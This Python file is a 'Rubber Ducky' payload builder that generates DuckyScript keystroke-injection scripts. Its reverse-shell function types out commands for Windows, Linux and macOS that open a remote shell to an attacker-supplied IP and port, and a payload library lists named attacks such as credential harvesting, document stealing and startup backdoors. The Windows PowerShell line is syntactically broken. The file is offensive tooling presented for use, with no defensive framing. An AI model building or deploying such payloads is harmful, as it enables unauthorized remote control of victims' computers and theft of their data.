"""Rubber Ducky Payload Builder"""
import json

class DuckyScriptBuilder:
    KEYS={"ENTER":"ENTER","TAB":"TAB","ESCAPE":"ESCAPE","SPACE":"SPACE",
          "BACKSPACE":"BACKSPACE","DELETE":"DELETE","INSERT":"INSERT",
          "UP":"UPARROW","DOWN":"DOWNARROW","LEFT":"LEFTARROW","RIGHT":"RIGHTARROW",
          "HOME":"HOME","END":"END","PAGEUP":"PAGEUP","PAGEDOWN":"PAGEDOWN",
          "F1":"F1","F2":"F2","F3":"F3","F4":"F4","F5":"F5","F6":"F6",
          "F7":"F7","F8":"F8","F9":"F9","F10":"F10","F11":"F11","F12":"F12",
          "PRINTSCREEN":"PRINTSCREEN","SCROLLLOCK":"SCROLLLOCK","PAUSE":"PAUSE"}
    
    def build_script(self,commands,delay_ms=100):
        lines=[f"REM DuckyScript by bad-antics",f"REM Generated payload",
               f"DEFAULTDELAY {delay_ms}",""]
        for cmd in commands:
            if isinstance(cmd,str): lines.append(cmd)
            elif isinstance(cmd,dict):
                if "string" in cmd: lines.append(f"STRING {cmd['string']}")
                if "delay" in cmd: lines.append(f"DELAY {cmd['delay']}")
                if "key" in cmd: lines.append(cmd["key"])
        return "\n".join(lines)
    
    def reverse_shell_payload(self,os_type,ip,port):
        payloads={
            "windows":[
                "DELAY 1000","GUI r","DELAY 500",f"STRING powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('{ip}',{port})"",
                "ENTER"],
            "linux":[
                "DELAY 1000","CTRL-ALT t","DELAY 500",
                f"STRING bash -i >& /dev/tcp/{ip}/{port} 0>&1","ENTER"],
            "macos":[
                "DELAY 1000","GUI SPACE","DELAY 500","STRING Terminal","ENTER","DELAY 1000",
                f"STRING bash -i >& /dev/tcp/{ip}/{port} 0>&1","ENTER"],
        }
        return self.build_script(payloads.get(os_type,payloads["linux"]))

class PayloadLibrary:
    CATEGORIES={
        "recon":["System Info Grab","WiFi Password Extract","Browser History Dump"],
        "exfil":["Document Stealer","Credential Harvester","Registry Dumper"],
        "persistence":["Startup Backdoor","Scheduled Task Creator","Registry Run Key"],
        "prank":["Wallpaper Changer","Mouse Jiggler","Caps Lock Toggle"],
    }
    
    def list_payloads(self): return self.CATEGORIES
    def count(self): return sum(len(v) for v in self.CATEGORIES.values())
